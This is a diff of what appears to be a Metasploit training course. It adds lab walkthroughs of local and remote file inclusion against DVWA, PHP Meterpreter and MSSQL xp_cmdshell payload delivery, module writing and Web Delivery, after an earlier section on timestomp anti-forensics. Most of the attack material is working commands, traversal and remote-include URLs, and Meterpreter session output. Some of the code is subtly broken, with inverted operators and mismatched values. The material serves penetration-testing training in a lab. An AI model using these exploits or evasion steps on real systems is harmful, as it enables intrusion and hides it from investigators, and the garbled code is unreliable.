@@ -8862,7 +8862,7 @@ However, there is something to consider in this case. We have hidden when an act
 
 The easiest way to approach this is to zero out the times on the full drive. This will make the job of the investigator very difficult, as traditional timeline analysis will not be possible. Let’s first look at our WINNT\system32 directory.
 
-.. image:: img\Timestomp_01.png
+  .. image:: img\Timestomp_01.png
 
 Everything looks normal. Now, let’s shake the filesystem up really bad!
 
@@ -8917,7 +8917,7 @@ Everything looks normal. Now, let’s shake the filesystem up really bad!
 
 So, after that what does Windows see?
 
-.. image:: img\Timestomp_02.png
+  .. image:: img\Timestomp_02.png
 
 
 Amazing. Windows has no idea what is going on, and displays crazy times all over the place. Don’t get overconfident however. By taking this action, you have also made it very obvious that some adverse activity has occurred on the system. Also, there are many different sources of timeline information on a Windows system other than just MAC times. If a forensic investigator came across a system that had been modified in this manner, they would be running to these alternative information sources. However, the cost of conducting the investigation just went up.
@@ -11581,3 +11581,6194 @@ At this point, we need to upload our shell to the remote web server that support
 
 File Inclusion Vulnerabilities
 =================================
+
+
+Remote File Inclusion (RFI) and Local File Inclusion (LFI) are vulnerabilities that are often found in poorly-written web applications. These vulnerabilities occur when a web application allows the user to submit input into files or upload files to the server.
+
+LFI vulnerabilities allow an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the web server through other means, then they may be able to execute arbitrary commands.
+
+RFI vulnerabilities are easier to exploit but less common. Instead of accessing a file on the local machine, the attacker is able to execute code hosted on their own machine.
+
+In order to demonstrate these techniques, we will be using the Damn Vulnerable Web Application (DVWA) within metasploitable. Connect to metasploitable from your browser and click on the DVWA link.
+
+The credentials to login to DVWA are:
+admin / password
+
+Once we are authenticated, click on the “DVWA Security” tab on the left panel. Set the security level to ‘low’ and click ‘Submit’, then select the “File Inclusion” tab.
+
+  .... image:: img/web_delivery0-2.png
+
+On the file inclusion page, click on the view source button on the bottom right. If your security setting is successfully set to low, you should see the following source code:
+
+::
+
+  $file = $_GET['page']; //The page we wish to display
+
+This piece of code in itself is not actually vulnerable, so where is the vulnerability? For a regular attacker who does not already have root access to the machine, this could be where their investigation ends. The $_GET variable is interesting enough that they would begin testing or scanning for file inclusion. Since we already have root access to the machine, lets try harder and see if we can find out where the vulnerability comes from.
+
+SSH to metasploitable with the following credentials:
+msfadmin / msfadmin.
+
+We can use cat to view the index.php within the /var/www/dvwa/vulnerabilities/fi/ directory.
+
+
+::
+
+  msfadmin: cat -n /var/www/dvwa/vulnerabilities/fi/index.php
+
+
+Looking at the output, we can see that there is a switch statement on line 15, which takes the security setting as input and breaks depending on which setting is applied. Since we have selected “low”, the code proceeds to call /source/low.php. If we look farther down in index.php, we can see that line 35 says:
+
+::
+
+  include($file);
+
+
+And there we have it! We’ve found the location of the vulnerability. This code is vulnerable because there is no sanitization of the user-supplied input. Specifically, the $file variable is not being sanitized before being called by the include() function.
+
+If the web server has access to the requested file, any PHP code contained inside will be executed. Any non-PHP code in the file will be displayed in the user’s browser.
+
+Now that we understand how a file inclusion vulnerability can occur, we will exploit the vulnerabilities on the include.php page.
+
+
+Local File Inclusion (LFI)
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+In the browser address bar, enter the following:
+
+::
+
+  http://192.168.80.134/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
+
+The “../” characters used in the example above represent a directory traversal. The number of “../” sequences depends on the configuration and location of the target web server on the victim machine. Some experimentation may be required.
+
+We can see that the contents of /etc/passwd are displayed on the screen. A lot of useful information about the host can be obtained this way. Some interesting files to look for include, but are not limited to:
+
+
++------------------------+--------------------------+--------------------------+
+| Linux File Locations  | Windows File Locations   | OS X/macOS File Locations |
++========================+==========================+===========================+
+| /etc/issue             | %SYSTEMROOT%\repair\system   |    /etc/fstab          |
++------------------------+-------------------------------+-----------------------+
+|/proc/version           | %SYSTEMROOT%\repair\SAM        |  /etc/master.passwd  |
++------------------------+----------------------------+---------------------------+
+| /etc/profile           | %WINDIR%\win.ini        | /etc/resolv.conf      |
++------------------------+-----------------------------+-------------------+
+| /etc/passwd           | %SYSTEMDRIVE%\boot.ini        | /etc/sudoers      |
++------------------------+----------------------------------+-------------------------+
+| /etc/shadow           | %WINDIR%\Panther\sysprep.inf        |  /etc/sysctl.conf     |
++------------------------+-------------------------------------+--------------------+
+| /root/.bash_history    | %WINDIR%\system32\config\AppEvent.Evt        | ...      |
++------------------------+-----------------------------------------+--------------+
+|  /var/log/dmessage     | ...        | ...      |
++------------------------+------------+----------+
+| /var/mail/root         | ...        | ...      |
++------------------------+------------+----------+
+|  /var/spool/cron/crontabs/root  | ...        | ...      |
++------------------------+------------+----------+
+| body row 2             | ...        | ...      |
++------------------------+------------+----------+
+| body row 2             | ...        | ...      |
++------------------------+------------+----------+
+
+
+
+
+  .. .. image:: img/kali2fileinclude1-3.png
+
+Sometimes during a Local File Inclusion, the web server appends “.php” to the included file. For example, including “/etc/passwd” gets rendered as “/etc/passwd.php”. This occurs when the include function uses a parameter like “?page” and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page.
+
+Remote File Inclusion (RFI)
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+This part of the demonstration requires some initial setup. We will take this as an opportunity to develop some Linux command line and PHP skills.
+
+In order for an RFI to be successful, two functions in PHP’s configuration file need to be set. “allow_url_fopen” and “allow_url_include” both need to be “On”. From the PHP documentation, we can see what these configurations do.
+
+allow_url_fopen – “This option enables the URL-aware fopen wrappers that enable accessing URL object like files. Default wrappers are provided for the access of remote files using the ftp or http protocol, some extensions like zlib may register additional wrappers.”
+
+allow_url_include – “This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once”
+
+To find DVWA’s configuration file, click on the “PHP info” tab on the left panel. This screen gives us a large amount of useful information, including the PHP version, the operating system of the victim, and of course, the configuration file. We can see that the loaded file is “/etc/php5/cgi/php.ini”.
+
+
+In metasploitable, we can open the php.ini file using nano:
+
+::
+
+  msfadmin: sudo nano /etc/php5/cgi/php.ini
+ sudo password: msfadmin
+
+
+In nano, type “ctrl-w” to find a string. Type in “allow_url” and hit enter. We should now be on line 573 of the php.ini file (type “ctrl-c” to find the current line in nano). Make sure that “allow_url_fopen” and “allow_url_include” are both set to “On”. Save your file with “ctrl-o”, and exit with “ctrl-x”. Now, restart metasploitable’s web server with:
+
+::
+
+  msfadmin: sudo /etc/init.d/apache2 restart
+
+
+In Kali, we need to set up our own web server for testing. First, create a test file called “rfi-test.php” and then start apache.
+
+::
+
+  root@kali:~# echo "Success." > /var/www/html/rfi-test.php
+ root@kali:~# systemctl start apache2
+
+
+Now we can test our RFI. On the “File Inclusion” page, type the following URL:
+
+::
+
+  http://192.168.80.134/dvwa/vulnerabilities/fi/?page=http://192.168.80.128/rfi-test.php
+
+
+From the output displayed on the top of the browser, we can see that the page is indeed vulnerable to RFI.
+
+To finish with this RFI, we’ll take a look at the php_include function on the PHP Meterpreter page
+
+
+PHP Meterpreter
+^^^^^^^^^^^^^^^^^^
+
+The Internet is littered with improperly coded web applications with multiple vulnerabilities being disclosed on a daily basis. One of the more critical vulnerabilities is Remote File Inclusion (RFI) that allows an attacker to force PHP code of their choosing to be executed by the remote site even though it is stored on a different site. Metasploit published not only a php_include module but also a PHP Meterpreter payload. This is a continuation of the remote file inclusion vulnerabilities page.
+
+The php_include module is very versatile as it can be used against any number of vulnerable webapps and is not product-specific. In order to make use of the file inclusion exploit module, we will need to know the exact path to the vulnerable site.
+
+Cookie Setup
+""""""""""""
+
+We’ll be using the Damn Vulnerable Web Application (DVWA) on metasploitable. For this particular application, we will need some cookie information from the web page. Specifically, we will need the PHP session ID of a logged on session, as well as DVWA’s security setting.
+
+To obtain the cookie information, we will use an Iceweasel add-on called “Cookies Manager+”. In Iceweasel, browse to about:addons and search for “cookies manager+”. Download and install Cookies Manager+ and restart your browser. Once logged into DVWA, go to tools -> Cookie Manager+ and find the entry for the victim IP-address. Copy the value of PHPSESSID, and make sure that “security” is set to “low”.
+
+Module Options
+"""""""""""""""
+
+Loading the module in metasploit, we can see a great number of options available to us.
+
+::
+
+  Module options (exploit/unix/webapp/php_include):
+
+   Name      Current Setting                                                      Required  Description
+   ----      ---------------                                                      --------  -----------
+   HEADERS                                                                        no        Any additional HTTP headers to send, cookies for example. Format: "header:value,header2:value2"
+   PATH      /                                                                    yes       The base directory to prepend to the URL to try
+   PHPRFIDB  /usr/share/metasploit-framework/data/exploits/php/rfi-locations.dat  no        A local file containing a list of URLs to try, with XXpathXX replacing the URL
+   PHPURI                                                                         no        The URI to request, with the include parameter changed to XXpathXX
+   POSTDATA                                                                       no        The POST data to send, with the include parameter changed to XXpathXX
+   Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                                                                          yes       The target address
+   RPORT     80                                                                   yes       The target port (TCP)
+   SRVHOST   0.0.0.0                                                              yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT   8080                                                                 yes       The local port to listen on.
+   SSL       false                                                                no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                                                        no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                                                                        no        The URI to use for this exploit (default is random)
+   VHOST                                                                          no        HTTP server virtual host
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+The most critical option to set in this particular module is the exact path to the vulnerable inclusion point. Where we would normally provide the URL to our PHP shell, we simply need to place the text XXpathXX and Metasploit will know to attack this particular point on the site.
+
+::
+
+  msf exploit(php_include) > set PHPURI /?page=XXpathXX
+ PHPURI => /?page=XXpathXX
+ msf exploit(php_include) > set PATH /dvwa/vulnerabilities/fi/
+ PATH => /dvwa/vulnerabilities/fi/
+ msf exploit(php_include) > set RHOST 192.168.80.134
+ RHOST => 192.168.1.150
+ msf exploit(php_include) > set HEADERS "Cookie:security=low; PHPSESSID=dac6577a6c8017bab048dfbc92de6d92"
+ HEADERS => Cookie:security=low; PHPSESSID=dac6577a6c8017bab048dfbc92de6d92
+
+In order to further show off the versatility of Metasploit, we will use the PHP Meterpreter payload.
+
+::
+
+  msf exploit(php_include) > set PAYLOAD php/meterpreter/bind_tcp
+ PAYLOAD => php/meterpreter/bind_tcp
+ msf exploit(php_include) > exploit
+
+ [*] Started bind handler
+ [*] Using URL: http://0.0.0.0:8080/ehgqo4
+ [*]  Local IP: http://192.168.80.128:8080/ehgqo4
+ [*] PHP include server started.
+ [*] Sending stage (29382 bytes) to 192.168.80.134
+ [*] Meterpreter session 1 opened (192.168.80.128:56931 -> 192.168.80.134:4444) at 2010-08-21 14:35:51 -0600
+
+ meterpreter > sysinfo
+ Computer    : metasploitable
+ OS          : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+ Meterpreter : php/php
+ meterpreter >
+
+
+Just like that, a whole new avenue of attack is opened up using Metasploit.
+
+
+Building A Module
+^^^^^^^^^^^^^^^^^^
+
+Writing your first Metasploit module can be a daunting task, especially if one does not code in Ruby on a regular basis. Fortunately the language’s syntax is intuitive enough, for anyone with prior programming and scripting knowledge, to make the transition (from Python for example) to Ruby.
+
+Before taking the plunge into module construction and development, let’s take a quick look at the some of the modules currently in place. These files can be used as our base for re-creating an attack on several different supported protocols, or crafting ones own custom module.
+
+::
+
+  root@kali:/usr/share/metasploit-framework/lib/msf/core/exploit# ls
+ afp.rb                    dect_coa.rb      mixins.rb          smb
+ arkeia.rb                 dhcp.rb          mssql_commands.rb  smb.rb
+ browser_autopwn.rb        dialup.rb        mssql.rb           smtp_deliver.rb
+ brute.rb                  egghunter.rb     mssql_sqli.rb      smtp.rb
+ brutetargets.rb           exe.rb           mysql.rb           snmp.rb
+ capture.rb                file_dropper.rb  ndmp.rb            sunrpc.rb
+ cmdstager_bourne.rb       fileformat.rb    ntlm.rb            tcp.rb
+ cmdstager_debug_asm.rb    fmtstr.rb        omelet.rb          telnet.rb
+ cmdstager_debug_write.rb  ftp.rb           oracle.rb          tftp.rb
+ cmdstager_echo.rb         ftpserver.rb     pdf_parse.rb       tns.rb
+ cmdstager_printf.rb       http             pdf.rb             udp.rb
+ cmdstager.rb              imap.rb          php_exe.rb         vim_soap.rb
+ cmdstager_tftp.rb         ip.rb            pop2.rb            wbemexec.rb
+ cmdstager_vbs_adodb.rb    ipv6.rb          postgres.rb        wdbrpc_client.rb
+ cmdstager_vbs.rb          java.rb          powershell.rb      wdbrpc.rb
+ db2.rb                    kernel_mode.rb   realport.rb        web.rb
+ dcerpc_epm.rb             local            remote             winrm.rb
+ dcerpc_lsa.rb             local.rb         riff.rb
+ dcerpc_mgmt.rb            lorcon2.rb       ropdb.rb
+ dcerpc.rb                 lorcon.rb        seh.rb
+
+
+Here we see several modules of interest, such as prepackaged protocols for Microsoft’s SQL, HTTP, TCP, FTP, SMTP, SNMP, Oracle, and many more. These files undergo constant changes and updates, adding new functionalities over time.
+
+Let’s start with a very simple program, navigate to /usr/share/metasploit-framework/modules/auxiliary/scanner/mssql and create the required Metasploit folder structure under your home directory to store your custom module. Metasploit automatically looks in this folder structure so no extra steps are required for your module to be found.
+
+::
+
+  root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/mssql# mkdir -p ~/.msf4/modules/auxiliary/scanner/mssql
+
+Then do a quick cp mssql_ping.rb ~/.msf4/modules/auxiliary/scanner/mssql/ihaz_sql.rb
+
+::
+
+  root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/mssql# cp mssql_ping.rb ~/.msf4/modules/auxiliary/scanner/mssql/ihaz_sql.rb
+
+Open the newly-created file using your favourite editor and we’ll begin crafting our example module, walking through each line and what it means:
+
+::
+
+  ##
+  # $Id: ihaz_sql.rb 7243 2009-12-04 21:13:15Z rel1k $   >--- automatically gets set for us when we check in
+  ##
+
+  ##
+  # This file is part of the Metasploit Framework and may be subject to           >---- licensing agreement, keep standard
+  # redistribution and commercial restrictions. Please see the Metasploit
+  # Framework web site for more information on licensing and terms of use.
+  # http://metasploit.com/framework/
+  ##
+
+
+ require 'msf/core'  >--- use the msf core library
+
+ class MetasploitModule < Msf::Auxiliary >---- its going to be an auxiliary module
+
+ include Msf::Exploit::Remote::MSSQL   >----- we are using remote MSSQL right?
+ include Msf::Auxiliary::Scanner  >----------- it use to be a SQL scanner
+
+ def initialize >---- initialize the main section
+    super(
+          'Name' => 'I HAZ SQL Utility',   >------- name of the exploit
+          'Version' => '$Revision: 7243 $', >------- svn number
+          'Description' => 'This just prints some funny stuff.', >------------ description of the exploit
+          'Author' => 'THE AUTHOR', >--- thats you
+          'License' => MSF_LICENSE >---- keep standard
+ )
+
+    deregister_options('RPORT', 'RHOST')    >---- do not specify RPORT or RHOST
+ end
+
+
+ def run_host(ip) >--- define the main function
+
+ begin >---begin the function
+ puts "I HAZ SQL!!!!"  >---- print to screen i haz SQL!!!
+ end >--- close
+ end >---- close
+ end >---- close
+
+
+Now that you have a basic idea of the module, save the above code (without the >—— comment strings) and let’s run it in msfconsole.
+
+::
+
+  msf > search ihaz
+ [*] Searching loaded modules for pattern 'ihaz'...
+
+ Auxiliary
+ =========
+
+ Name Description
+ ---- -----------
+ scanner/mssql/ihaz_sql MSSQL Ping Utility
+
+ msf > use scanner/mssql/ihaz_sql
+ msf auxiliary(ihaz_sql) > show options
+
+ Module options:
+
+ Name        Current Setting                                     Required Description
+ ----        ---------------                                     -------- -----------
+ HEX2BINARY /pentest/exploits/framework3/data/exploits/mssql/h2b no       The path to the hex2binary script on the disk
+ MSSQL_PASS                                                      no       The password for the specified username
+ MSSQL_USER sa                                                   no       The username to authenticate as
+ RHOSTS                                                          yes      The target address range or CIDR identifier
+ THREADS    1                                                    yes      The number of concurrent threads
+
+ msf auxiliary(ihaz_sql) > set RHOSTS doesntmatter
+ RHOSTS => doesntmatter
+ msf auxiliary(ihaz_sql) > exploit
+ I HAZ SQL!!!!
+
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+
+
+Success! Our module has been added! Now that we have a basic understanding of how to add a module, let’s take a closer look at the MSSQL module written for the Metasploit framework.
+
+
+Payloads Through MSSQL
+^^^^^^^^^^^^^^^^^^^^
+
+In the previous section, we created a very basic module to get a better understanding of the principles behind a build. This section briefly explains passing payloads using the MSSQL module. The code presented currently works on the following installations of Microsoft’s SQL Server: 2000, 2005, and 2008. We will first walk through the code and explain how this attack vector works before making our own from the ground up.
+
+When an administrator first installs MSSQL, they have the option of using either mixed-mode authentication or SQL-based authentication. Using the latter, a password for the ‘sa’ account must be specified by the administrator. The ‘sa’ account is the systems administrator for the SQL server and has most, if not all, permissions on the system. Guessing this password, either using social engineering or other means, one can leverage this attack vector using Metasploit and perform additional actions. In a previous module, we discussed discovering which TCP port MSSQL is using by querying UDP port 1434 and executing dictionary attacks for guessing the ‘sa’ password.
+
+For our purposes, we’ll assume we are aware of the SQL system administrator’s account password. If you wish to recreate this attack, you will need to have a working copy of Microsoft Windows as well as any of the previously mentioned versions of MSSQL.
+
+Let’s launch the attack:
+
+::
+
+  msf > use windows/mssql/mssql_payload
+ msf exploit(mssql_payload) > options
+
+ Module options (exploit/windows/mssql/mssql_payload):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd, or old)
+   PASSWORD                              no        The password for the specified username
+   RHOST                                 yes       The target address
+   RPORT                1433             yes       The target port (TCP)
+   SRVHOST              0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT              8080             yes       The local port to listen on.
+   SSL                  false            no        Negotiate SSL for incoming connections
+   SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   URIPATH                               no        The URI to use for this exploit (default is random)
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+ msf exploit(mssql_payload) > set payload windows/meterpreter/reverse_tcp
+ payload => windows/meterpreter/reverse_tcp
+ msf exploit(mssql_payload) > set LHOST 10.10.1.103
+ LHOST => 10.10.1.103
+ msf exploit(mssql_payload) > set RHOST 172.16.153.129
+ RHOST => 172.16.153.129
+ msf exploit(mssql_payload) > set LPORT 8080
+ LPORT => 8080
+ msf exploit(mssql_payload) > set PASSWORD ihazpassword
+ MSSQL_PASS => ihazpassword
+ msf exploit(mssql_payload) > exploit
+
+ [*] Started reverse handler on port 8080
+ [*] Warning: This module will leave QiRYOlUK.exe in the SQL Server %TEMP% directory
+ [*] Writing the debug.com loader to the disk...
+ [*] Converting the debug script to an executable...
+ [*] Uploading the payload, please be patient...
+ [*] Converting the encoded payload...
+ [*] Executing the payload...
+ [*] Sending stage (719360 bytes)
+ [*] Meterpreter session 1 opened (10.10.1.103:8080 -> 10.10.1.103:47384)
+
+ meterpreter > execute -f cmd.exe -i
+ Process 3740 created.
+ Channel 1 created.
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+
+ C:\WINDOWS\system32>
+
+
+Creating Our Auxiliary Module
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We will be looking at three different files, they should be relatively familiar from prior sections.
+
+::
+
+  /usr/share/metasploit-framework/lib/msf/core/exploit/mssql_commands.rb
+ /usr/share/metasploit-framework/lib/msf/core/exploit/mssql.rb
+ /usr/share/metasploit-framework/modules/exploits/windows/mssql/mssql_payload.rb
+
+
+Lets first take a look at the ‘mssql_payload.rb’ as to get a better idea at what we will be working with.
+
+::
+
+  ##
+ # $Id: mssql_payload.rb 7236 2009-10-23 19:15:32Z hdm $
+ ##
+
+ ##
+ # This file is part of the Metasploit Framework and may be subject to
+ # redistribution and commercial restrictions. Please see the Metasploit
+ # Framework web site for more information on licensing and terms of use.
+ # http://metasploit.com/framework/
+ ##
+
+ require 'msf/core'
+
+ class Metasploit3 > Msf::Exploit::Remote
+
+ include Msf::Exploit::Remote::MSSQL
+ def initialize(info = {})
+
+ super(update_info(info,
+ 'Name' => 'Microsoft SQL Server Payload Execution',
+ 'Description' => %q{
+ This module will execute an arbitrary payload on a Microsoft SQL
+ Server, using the Windows debug.com method for writing an executable to disk
+ and the xp_cmdshell stored procedure. File size restrictions are avoided by
+ incorporating the debug bypass method presented at Defcon 17 by SecureState.
+ Note that this module will leave a metasploit payload in the Windows
+ System32 directory which must be manually deleted once the attack is completed.
+ },
+ 'Author' => [ 'David Kennedy "ReL1K"
+ 'License' => MSF_LICENSE,
+ 'Version' => '$Revision: 7236 $',
+ 'References' =>
+ [
+ [ 'OSVDB', '557'],
+ [ 'CVE', '2000-0402'],
+ [ 'BID', '1281'],
+ [ 'URL', 'http://www.thepentest.com/presentations/FastTrack_ShmooCon2009.pdf'],
+ ],
+ 'Platform' => 'win',
+ 'Targets' =>
+ [
+ [ 'Automatic', { } ],
+ ],
+ 'DefaultTarget' => 0
+ ))
+ end
+
+ def exploit
+
+ debug = false # enable to see the output
+
+ if(not mssql_login_datastore)
+ print_status("Invalid SQL Server credentials")
+ return
+ end
+
+ mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded), debug)
+
+ handler
+ disconnect
+ end
+
+
+While this file may seem simple, there is actually a lot of going on behind the scenes. Lets break down this file and look at the different sections. Specifically we are calling from the mssql.rb in the lib/msf/core/exploits area.
+
+One of the first things that is done in this file is the importation of the Remote class, and inclusion of the MSSQL module.
+
+::
+
+  class Metasploit3 > Msf::Exploit::Remote
+
+ include Msf::Exploit::Remote::MSSQL
+
+
+The reference section simply enumerates additional information concerning the attack or the initial exploit proof of concept. This is where we would find OSVDB references, EDB references and so on.
+
+::
+
+  'References' =>
+	[
+	[ 'OSVDB', '557'],
+	[ 'CVE', '2000-0402'],
+	[ 'BID', '1281'],
+	[ 'URL', 'http://www.thepentest.com/presentations/FastTrack_ShmooCon2009.pdf'],
+ ],
+
+
+The platform section indicates the target’s platform and version. The following part is the ‘Targets’ object, which is where different versions would be enumerated. These lines give the user the ability to select a target prior to an attack. The ‘DefaultTarget’ value is used when no target is specified when setting up the attack.
+
+::
+
+  'Platform' => 'win',
+ 'Targets' =>
+	[
+	[ 'Automatic', { } ],
+ ],
+ 'DefaultTarget' => 0
+
+
+The ‘def exploit’ line indicates the beginning of our exploit code. The next declaration is for debugging purposes. Considering there is a lot of information going back and forth, it’s a good idea having this set to ‘false’ until it’s needed.
+
+::
+
+  debug = false # enable to see the output
+
+
+Moving on to the next line, this is the most complex portion of the entire attack. This one liner here is really multiple lines of code being pulled from mssql.rb.
+
+::
+
+  mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded), debug)
+
+mssql_upload_exec (function defined in mssql.rb for uploading an executable through SQL to the underlying operating system)
+
+Msf::Util::EXE.to_win32pe(framework,payload.encoded) = create a metasploit payload based off of what you specified, make it an executable and encode it with default encoding
+
+debug = call the debug function is it on or off?
+
+Lastly the handler will handle the connections from the payload in the background so we can accept a metasploit payload. The disconnect portion of the code ceases the connection from the MSSQL server.
+
+Now that we have walked through this portion, we will break down the next section in the mssql.rb to find out exactly what this attack was doing.
+
+
+The Guts Behind an Auxiliary Module
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Looking int the ‘mssql.rb’ file using a text editor, locate the ‘mssql_upload_exec’. We should be presented with the following:
+
+::
+
+  #
+ # Upload and execute a Windows binary through MSSQL queries
+ #
+ def mssql_upload_exec(exe, debug=false)
+ hex = exe.unpack("H*")[0]
+
+ var_bypass = rand_text_alpha(8)
+ var_payload = rand_text_alpha(8)
+
+ print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+ print_status("Writing the debug.com loader to the disk...")
+ h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+ h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+ h2b.split(/\n/).each do |line|
+ mssql_xpcmdshell("#{line}", false)
+ end
+
+ print_status("Converting the debug script to an executable...")
+ mssql_xpcmdshell("cmd.exe /c cd %TEMP% && cd %TEMP% && debug > %TEMP%\\#{var_bypass}", debug)
+ mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)
+
+ print_status("Uploading the payload, please be patient...")
+ idx = 0
+ cnt = 500
+ while(idx > hex.length - 1)
+ mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false)
+ idx += cnt
+ end
+
+ print_status("Converting the encoded payload...")
+ mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
+ mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
+ mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+
+ print_status("Executing the payload...")
+ mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+ end
+
+
+The def mssql_upload_exec(exe, debug=false) requires two parameters and sets the debug to false by default unless otherwise specified.
+
+::
+
+  def mssql_upload_exec(exe, debug=false)
+
+The hex = exe.unpack(“H*”)[0] is some Ruby Kung-Fuey that takes our generated executable and magically turns it into hexadecimal for us.
+
+::
+
+  hex = exe.unpack("H*")[0]
+
+var_bypass = rand_text_alpha(8) and var_payload = rand_text_alpha(8) creates two variables with a random set of 8 alpha characters, for example: PoLecJeX
+
+
+::
+
+  var_bypass = rand_text_alpha(8)
+
+The print_status must always be used within Metasploit, ‘puts’ is no longer accepted in the framework. If you notice there are a couple things different for me vs. python, in the print_status you’ll notice “#{var_payload}.exe this subsititues the variable var_payload into the print_status message, so you would essentially see portrayed back “PoLecJeX.exe”
+
+
+::
+
+  print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+
+
+Moving on, the h2b = File.read(datastore[‘HEX2BINARY’], File.size[datastore[‘HEX2BINARY’])) will read whatever the file specified in the “HEX2BINARY” datastore, if you look at when we fired off the exploit, it was saying “h2b”, this file is located at data/exploits/mssql/h2b, this is a file that I had previously created that is a specific format for windows debug that is essentially a simple bypass for removing restrictions on filesize limit. We first send this executable, windows debug converts it back to a binary for us, and then we send the metasploit payload and call our prior converted executable to convert our metasploit file.
+
+::
+
+  h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+ h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+ h2b.split(/\n/).each do |line|
+
+
+The h2b.gsuc!(/KemneE3N/, “%TEMP%\\#{var_bypass}”) is simply substituing a hardcoded name with the dynamic one we created above, if you look at the h2b file, KemneE3N is called on multiple occasions and we want to randomly create a name to obfuscate things a little better. The gsub just substitutes the hardcoded with the random one.
+
+The h2b.split(/\n/).each do |line| will start a loop for us and split the bulky h2b file into multiple lines, reason being is we can’t send the entire bulk file over at once, we have to send it a little at a time as the MSSQL protocol does not allow us very large transfers through SQL statements.
+
+Lastly, the mssql_xpcmdshell(“#{line}”, false) sends the initial stager payload line by line while the false specifies debug as false and to not send the information back to us.
+
+The next few steps convert our h2b file to a binary for us utilizing Windows debug, we are using the %TEMP% directory for more reliability. The mssql_xpcmdshell strored procedure is allowing this to occur.
+
+The idx = 0 will server as a counter for us to let us know when the filesize has been reached, and the cnt = 500 specifies how many characters we are sending at a time. The next line sends our payload to a new file 500 characters at a time, increasing the idx counter and ensuring that idx is still less than the hex.length blob.
+
+Once that has been finished the last few steps convert our metasploit payload back to an executable using our previously staged payload then executes it giving us our payload!
+
+::
+
+  idx = 0
+
+So we’ve walked through the creation of an overall attack vector and got more familiar with what goes on behind the curtains. If your thinking about creating a new module, look around there is usually something that you can use as a baseline to help you create it.
+
+
+Web Delivery
+================
+
+Metasploit’s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine.
+
+This exploit requires a method of executing commands on the victim machine. In particular you must be able to reach the attacking machine from the victim. Remote command execution is a great example of an attack vector where using this module is possible. The web delivery script works on php, python, and powershell based applications.
+
+This exploit becomes a very useful tool when the attacker has some control of the system, but does not possess a full shell. In addition, since the server and payload are both on the attacking machine, the attack proceeds without being written to disk. This helps keep the attacking fingerprint low.
+
+This is an example of the execution of this module on the Damn Vulnerable Web Application (DVWA) within Metasploitable.
+
+Click on “DVWA Security” in the left panel. Set the security level to “low” and click “Submit”.
+
+First, we check for simple command execution.
+
+Click on “Command Execution”. Enter an IP address followed by a semi-colon and the command you wish to execute.
+
+Next, we need to make sure that we can connect with the attacking host. Because of the nature of this particular application, this was achieved above. Generally, be sure to ping, telnet or otherwise call the host.
+
+Now we can set the necessary options and run the exploit. Note that the target must be specified before the payload
+
+::
+
+  msf > use exploit/multi/script/web_delivery
+ msf exploit(web_delivery) > set TARGET 1
+ TARGET => 1
+ msf exploit(web_delivery) > set PAYLOAD php/meterpreter/reverse_tcp
+ PAYLOAD => php/meterpreter/reverse_tcp
+ msf exploit(web_delivery) > set LHOST 192.168.80.128
+ LHOST => 192.168.80.128
+
+ msf exploit(web_delivery) > show options
+
+ Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
